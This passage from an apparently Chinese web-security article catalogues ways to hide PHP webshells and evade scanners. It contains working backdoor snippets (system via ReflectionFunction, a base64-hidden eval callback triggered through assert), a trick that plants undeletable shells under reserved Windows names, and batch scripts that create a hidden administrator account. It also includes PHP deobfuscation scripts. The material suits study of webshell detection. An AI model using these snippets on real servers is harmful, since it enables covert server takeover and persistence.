s46f4VU/9pjf7BlT/+6bu3e/0jFqJRpv9IZoj8AlLcayWTMskMkQD7N4kxRMGumD6v5EbRLyi2ZIIuMGSIAKAhEl520+MNfPDR8UcfK/3RtLUby7/s9gRGetmN0nQBIUSJEUC5CiSkTbCw+I25hFT9LLOgSh8zuSy5kazhJ6nXhKX1pMYQhTVXRwwIEQCSI413qqiZZeZqh/JeKXOBHnYf7qIyciHL5pFuJbcrX4dIlvSTrPNHZqbxX4CfP1LE+SQ8BNESZpkBIHOkV4gJMkR+EWS5EUbBC7OpmGdC4DpEAMgk2X8vs5q7WbIDuFMFADJM9gsRkAWECADJQS4Q6/FHEEX10uGkos8X9vhhgVgtAkIEgOQgSwg4OoYQRfmCkaSi1zfk6Bg6fx1KCGgOECIAJAdZZMpxLTiSIlPNg45rQSgypUFAiACQHFCGNIcBIQJAcoAQcxgQIgAkBwgxhwEhAkBygBBzGBAiACQHCDGHASECQHKIhQiRSwFCBIAkEAgxVWiz6p7CEtmjbJzzgBCBvCBtQiQZm6p7ZEvhOtWMW7UmRMGKZDSdRGE/ccsxrdoKQgTyAk0JcRRV93jLCDKy4BcFTXoBiDEWIlOA1Mg/Me4Pkqiwn2TLVNZjEQBCBPKCNApxbKvukUuH2cymAqNRJ1P1SSVp6TIrF3XRywtRuiVZdSu1gBCBvCC9QkxP1T0mbawl18pmmhGO45W31/FX2CZTUvYkOJsTlaQkSqxgR+P1XxVX9FIQIrd8pLiwn1xLuaXFRw8IEcgL0i/EMaq6xy+gbHAQz+JFZPlCJNXGDcORaSZFNCZH9Jg2eLc2s0mv1zPHYg6qOruUFaJkVihZpYDfMpULbpOAEIG8IO1CHKuqe/ghThtZ83J7E2SI+BCsU3gbcWPBuq3kdoPRwiS8tcJjMb+aoISLOMuTFiJ/5XDB31An+M8xdmWdSUCIQF6QZiGOXdU9mu0aE91th4Ey1BK9yNQKEe+/IK5Fvc1ey58mYjraCimbhBDlbShx2qKWkCECwCjIxBiiBKOvusc2KyggUiSL0WA0GvHeEgnRZdLr8A4tRoNyl5lpr9fryY4zTk7LOSkrTHALnpX43WUK+0m2HMOJIBAikBdobJZ5hFX38AbBy5mOKv9yHAUh8k6yyGzmz1NLXPpDjDPG24gvHpSZIBb8NXQ2u4tfFJAbRhAX9lNoCbPMADByNJUhQtW90QHXIQLA6MjIhdkpJXeq7o0SuFMFAEZL9gsRSAcgRCAvACECagAhAnkBCBFQAwgRyAtAiIAaQIhAXoCFCAAJASECOQ4IEVAPCBHIcTYBgGpAiEB+4ff729raqqurP/nkkw0bNpQBAAEIEcgvQqFQZ2fn6dOnq6ur9+3btxcACP4/zFbR0QVxidIAAAAASUVORK5CYII=)

```text
这是一种利用数学运算符来进行WEBSHELL隐藏的一个思路，举一反三，还可以使用其他的数学运算符来进行相似的隐藏效果
```

### 0x32：利用PHP扩展隐藏后门WEBSHELL木马

```text
这种情况需要黑客已经对目标服务器具有一定的控制权，可以修改目标服务器的php.ini并且可以上传扩展文件.so、.dll到指定目录下。这种扩展型的后门木马的效果非常好，
对静态检测程序、和动态沙箱检测程序的bypass特性都有很好的
表现。技术上说，这种利用PHP扩展隐藏后门的方法还有分为两种
　　1) 编写扩展程序，Hook某些核心的PHP函数的执行流，并通过检测网络流量中是否出现指定的关键字(例如攻击者可以指定pwd:作为命令的触发标识)来决定是启动后门程序，并执行指令
　　2) 编写扩展程序，生成一些新的函数(例如backdoor_eval())，这样，黑客就可以在自己的WEBSHELL.PHP中调用这种函数，从而躲避静态检测程序的检测
http://www.kissthink.com/archive/3482.html
```

### 0x33: 猥琐流PHP层层加密隐藏 

```text
http://blog.wangzhan.360.cn/?p=65
```

### 0x34: 利用非常规字符集来绕过"关键字检测正则"的防御\(包括神盾加密在内的主流在线加密工具基本都采用变量/函数/类名混淆的方式实现隐藏\)

```text
http://www.cnblogs.com/52cik/p/php-variable-character.html
http://www.cnblogs.com/52cik/p/php-phpdp-thinking.html
http://www.php.net/manual/zh/language.variables.basics.php
http://x95.org/decryption-phpdp-and-phpjm.html
这种基于字符集的bypass思路是一种很好的技巧，可以绕过很多基于"指定模式的正则匹配"的webshell检测软件
```

**1. 神盾加密解密方案**

```text
php
$str = file_get_contents("Code.php");

// 第一步 替换所有变量
// 正则 \$[a-zA-Z_\x7f-\xff][\w\x7f-\xff]*
preg_match_all('|\$[a-zA-Z_\x7f-\xff][\w\x7f-\xff]*|', $str, $params) or die('err 0.');
$params = array_unique($params[0]); // 去重复
$replace = array();
$i = 1;
foreach ($params as $v) {
    $replace[] = '$p' . $i;
    tolog($v . ' => $p' . $i); // 记录到日志
    $i++;
}
$str = str_replace($params, $replace, $str);


// 第二步 替换所有函数名
// 正则 function ([a-zA-Z_\x7f-\xff][\w\x7f-\xff]*)
preg_match_all('|function ([a-zA-Z_\x7f-\xff][\w\x7f-\xff]*)|', $str, $params) or die('err 0.');
$params = array_unique($params[1]); // 去重复
$replace = array();
$i = 1;
foreach ($params as $v) {
    $replace[] = 'fun' . $i;
    tolog($v . ' => fun' . $i); // 记录到日志
    $i++;
}
$str = str_replace($params, $replace, $str);

// 第三步 替换所有不可显示字符
function tohex($m) {
    $p = urlencode($m[0]); // 把所有不可见字符都转换为16进制、
    $p = str_replace('%', '\x', $p);
    $p = str_replace('+', ' ', $p); // urlencode 会吧 空格转换为 + 
    return $p;
}
$str = preg_replace_callback('|[\x00-\x08\x0e-\x1f\x7f-\xff]|s', "tohex", $str);

// 写到文件
file_put_contents("Code.decode.php", $str);

function tolog($str) {
    file_put_contents("replace_log.txt", $str . "\n", FILE_APPEND);
}
?>
```

**2.  找源码解密**

```text
php
$file = 'plugin.php';  //要破解的文件


$fp = fopen($file, 'r');
$str = fread($fp, filesize($file));
fclose($fp);

copy($file, '0_'.$file);

$n = 1;
while($n < 10){
    $code = strdecode($str);
    if($n == 1){
        $code = str_replace("__FILE__", "'0_$file'", $code);
    }
    
    $replace = '$decode'.$n.'=trim';
    if(strpos($code, 'eval(') > 0){
        $code = str_replace('eval(', $replace.'(', $code);
    }else{
        preg_match("/@\\$(.*)\(\\$(.*),(.*)\(/isU", $code, $res);
        $code = str_replace($res[3], "'$replace", $code);
    }
    
    $code = preg_replace('/\\$(.*)=false;(.*?)\(\);/', '', $code); //上一版本
    $code = preg_replace('/\|\|@\\$(.*?)\(\);/', '|| print("ok");', $code);
    
    $code = destr($code);
    $tmp_file = 'detmp'.$n.'.php';
    file_put_contents($tmp_file, $code);
    include($tmp_file);

    $val = 'decode'.$n;
    $str = $$val;
    
    unlink($tmp_file);
    
    if(strpos($str, ';?>') === 0){
        $decode = $str;
        break;
    }
    
    $str = "". $str;
    $n++;
}


$decode = preg_replace("/^(.*)exit\('Access Denied'\); /", "", $decode);
$del = strrchr($decode, 'unset');
$decode = str_replace($del, "\r\n?>", $decode);
file_put_contents($file.'.de.php' ,$decode);
unlink('0_'.$file);
echo 'done';

////////////
function val_replace($code, $val, $deval){
    $code = str_replace('$'.$val.',', '$'.$deval.',', $code);
    $code = str_replace('$'.$val.';', '$'.$deval.';', $code);
    $code = str_replace('$'.$val.'=', '$'.$deval.'=', $code);
    $code = str_replace('$'.$val.'(', '$'.$deval.'(', $code);
    $code = str_replace('$'.$val.')', '$'.$deval.')', $code);
    $code = str_replace('$'.$val.'.', '$'.$deval.'.', $code);
    $code = str_replace('$'.$val.'/', '$'.$deval.'/', $code);
    $code = str_replace('$'.$val.'>', '$'.$deval.'>', $code);
    $code = str_replace('$'.$val.'<', '$'.$deval.'<', $code);
    $code = str_replace('$'.$val.'^', '$'.$deval.'^', $code);
    $code = str_replace('$'.$val.'||', '$'.$deval.'||', $code);
    $code = str_replace('($'.$val.' ', '($'.$deval.' ', $code);
    return $code;
}

function fmt_code($code){
    global $vals,$funs;
    preg_match_all("/\\$[0-9a-zA-Z\[\]']+(,|;)/iesU", $code, $res);
    foreach($res[0] as $v){
        $val = str_replace(array('$',',',';'), '', $v);
        $deval = destr($val, 1);
        $vals[$val] = $deval;
        $code = val_replace($code, $val, $deval);
    }

    preg_match_all("/\\$[0-9a-zA-Z\[\]']+=/iesU", $code, $res);
    foreach($res[0] as $v){
        $val = str_replace(array('$','='), '', $v);
        $deval = destr($val, 1);
        $vals[$val] = $deval;
        $code = val_replace($code, $val, $deval);
    }

    preg_match_all("/function\s[0-9a-zA-Z\[\]]+\(/iesU", $code, $res);
    foreach($res[0] as $v){
        $val = str_replace(array('function ','('), '', $v);
        $deval = destr($val, 1);
        $funs[$val] = $deval;
        $code = str_replace('function '.$val.'(', 'function '.$deval.'(', $code);
        $code = str_replace('='.$val.'(', '='.$deval.'(', $code);
        $code = str_replace('return '.$val.'(', 'return '.$deval.'(', $code);
    }
    return $code;
}

function strdecode($str){
    $len = strlen($str);
    $newstr = '';
    for($i=0; $i<$len; $i++){
        $n = ord($str[$i]);
        $newstr .= decode($n);
    }
    return $newstr;
}

function decode($dec){
    if(($dec > 126 || $dec<32) && $dec<>13 && $dec<>10){
        return '['.$dec.']';
    }else{
        return chr($dec);
    }
}

function destr($str, $val=0){
    $k = 0;
    $num = '';
    $n = strlen($str);
    $code = '';
    for($i=0; $i<$n; $i++){
        if($str[$i] == '[' && ($str[$i+1]==1 || $str[$i+1]==2)){
            $k = 1;
        }elseif($str[$i] == ']' && $k==1){
            $num = intval($num);
            if($val==1){
                $num = 97 + fmod($num, 25);
            }
            $code .= chr($num);
            $k = 0;
            $num = null;
        }else{
            if($k == 1){
                $num .= $str[$i];
            }else{
                $code .= $str[$i];
            }
        }
    }
    return $code;
}
?> 
```

**Relevant Link:**

```text
http://www.cnblogs.com/52cik/p/php-phpdp-thinking.html
http://www.phpdp.org/
http://www.zhaoyuanma.com/phpencode.html
```

### 0x35: 利用ReflectionFunction反射进行动态函数执行 

```text
http://php.net/manual/zh/class.reflectionfunction.php
http://php.net/manual/zh/reflectionfunction.invokeargs.php
php
    $func = new ReflectionFunction("system");
    echo $func->invokeArgs(array("$_GET[c]"));
?>
```

###  0x36: 基于Winapi 函数FindFirstFile\(\)导致的畸形文件名

```text
https://code.google.com/p/pasc2at/wiki/SimplifiedChinese
http://www.2cto.com/Article/201407/320879.html
可以利用下面的脚本来生成一个"畸形文件名"
php
    for ($j=0; $j<256; $j++) 
    {
        for ($i=0; $i<256; $i++) 
        {
            /*
            确保在当前目录下有一个"1.php"文件
            */
            $url = '1.p' . chr($j) . chr($i);
            $tmp = @file_get_contents($url);
            if (!empty($tmp)) 
            {
                echo "1.p" . chr($j) . chr($i) . "
";
            }
        }
    }
?>
result(得到的结果):
1.p><
1.p>>
1.p>P
1.p>p
1.pH<
1.pH>
1.pHP
1.pHp
1.ph<
1.ph>
1.phP
1.php
1.p< 
1.p<"
1.p<.
1.p<<
1.p<>

对于这种利用方式，我们只能说这样得到的文件扩展名都是可以被windows正确解析的，存在从而来进行bypass那些过滤了文件扩展名的webshell检测机制，但是要真正地利用它发动攻击，我觉得还有很多限制
1. 这个issue只能在windows上才存在
2. 但是windows的文件系统明确禁止了一些特殊字符作为文件名
    1) <
    2) >
    3) .(虽然没有禁止，但是会被windows自动删除)
    4) *
3. 所以理论上我们根本没办法在磁盘上写入这样的畸形后缀的文件，bypass也就无从谈起
```

### 0x37：webshell中的不死僵尸 

```text
利用系统保留文件名创建无法删除的webshell
Windows 下不能够以下面这些字样来命名文件/文件夹：
1. aux
2. prn
3. con
4. nul
5. com1
6. com2
7. com3
8. com4
9. com5
10. com6
11. com7
12. com8
13. com9
14. lpt1
15. lpt2
16. lpt3
17. lpt4
18. lpt5
19. lpt6
20. lpt7
21. pt8
22. lpt9
但是通过cmd的copy命令即可实现
D:\wwwroot>copy rootkit.asp \\.\D:\wwwroot\lpt6.shell.asp 
注意: 前面必须有"\\.\" 
这类文件无法在图形界面删除，只能在命令行下删除：
D:\wwwroot>del \\.\D:\wwwroot\lpt6.shell.asp
然而在IIS中，这种文件又是可以解析成功的。Webshell中的 "不死僵尸" 原理就在这
```

### 0x38: 利用组策略的自动执行脚本隐藏webshell 

```text
准备开关机脚本  
关机.bat
@echo off
net user hxhack 123456/add
net localgroup administrators hxhack/add
　　  
启动.bat
@echo off
net user hxhack/del
　
启用开关机脚本
1. 点击"开始"菜单-运行"，输入命令"gpedit.msc"，回车后打开组策略编辑器程序窗口
2. 依次展开"计算机配置"-"windows设置"-"脚本(启动/关机)"项目
3. 双击右侧的"启动"。打开启动脚本设置对话框。点击"显示文件"按钮，将会自动打开系统启动脚本目录
4. 将刚才建立的"启动.bat"移动到此文件夹中。然后关闭文件夹窗口。在启动脚本对话框中。点击"添加"按钮，浏览指定当前目录下的开机脚本文件"启动.bat"。
5. 点击确定按钮。完成添加。再点击"应用"按钮，使用当前启动设置。关闭启动脚本设置对话框。然后双击组策略编辑器中的"关机"项目，打开关机脚本设置对话框，用同样的方法添加关机脚本为"关机.bat"。最后关闭组策略编辑器 
```

待研究

```text
https://github.com/tennc/webshell
https://github.com/JohnTroony/php-webshells
```

### 0x39: 利用PHP自定义函数回调执行webshell ****

```php
php
    if(key($_GET)=='dede')
        //call_user_func($_GET['dede'], "@eval($_POST[bs]);");
        call_user_func($_GET['dede'], base64_decode('QGV2YWwoJF9QT1NUW2JzXSk7'));
?>
http://php.net/manual/zh/function.call-user-func.php

php 
    //call_user_func($_GET['dede'], "@eval($_POST[bs]);");
    call_user_func($_GET['dede'], base64_decode('QGV2YWwoJF9QT1NUW2JzXSk7')); 
?>
http://localhost/test/test.php?dede=assert
```

### 0x40: 利用PHP扩展定界标签实现正则检测绕过

PHP是一种和HTML混编的脚本语言，它允许的定界标签如下

1. 'if you want to serve XHTML or XML documents, do it like this'; ?&gt;//永远可用
2.  'if you want to serve XHTML or XML documents, do it like this';//PHP允许半闭合
3. //永远可用
4. //单引号
5. //无引号

